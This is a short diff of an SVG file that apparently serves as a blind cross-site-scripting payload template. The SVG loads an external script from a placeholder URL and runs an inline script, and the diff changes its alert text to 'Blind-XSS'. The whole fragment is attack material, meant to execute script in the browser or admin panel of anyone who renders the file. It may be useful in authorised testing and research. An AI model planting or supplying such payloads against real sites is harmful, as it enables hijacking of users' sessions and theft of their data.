@@ -12,7 +12,7 @@
     <script xlink:href="https://your-urls-here" />
     <script>
       //<![CDATA[
-        alert("ble");
+        alert("Blind-XSS");
       ]]>
     </script>
   </svg>
